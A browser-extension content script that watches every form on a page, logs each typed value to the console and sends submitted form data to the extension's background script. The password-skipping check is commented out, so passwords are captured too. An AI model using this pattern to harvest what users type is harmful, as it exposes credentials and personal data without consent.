console.log("Content script loaded and running!");
console.log("Content script loaded and running!");

function handleInputChange(event) {
  const input = event.target;
  const inputType = input.getAttribute("type");
  // if (inputType !== "password") {
  // Skip password fields for security
  console.log(
    `Input in form changed: ${input.name || "unnamed"} = ${input.value}`
  );
  // Optionally, store or send this data for replication
  // }
}

function handleFormSubmit(event) {
  const form = event.target;
  let formDetails = {};
  new FormData(form).forEach((value, key) => {
    formDetails[key] = value;
  });
  console.log(`Form submitted with data:`, formDetails);
  // Send message to background script if needed
  chrome.runtime.sendMessage({ action: "logForm", details: formDetails });
}

function attachEventListenersToForm(formElement) {
  const inputs = formElement.querySelectorAll("input, textarea, select");
  inputs.forEach((input) => input.addEventListener("input", handleInputChange));
  formElement.addEventListener("submit", handleFormSubmit);
}

// Observe the document for additions of form elements
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    mutation.addedNodes.forEach((node) => {
      if (node.nodeType === Node.ELEMENT_NODE) {
        if (node.tagName === "FORM") {
          attachEventListenersToForm(node);
        } else {
          const forms = node.querySelectorAll("form");
          forms.forEach(attachEventListenersToForm);
        }
      }
    });
  });
});

observer.observe(document, {
  childList: true,
  subtree: true,
});

// Attach event listeners to all forms
document.querySelectorAll("form").forEach(attachEventListenersToForm);
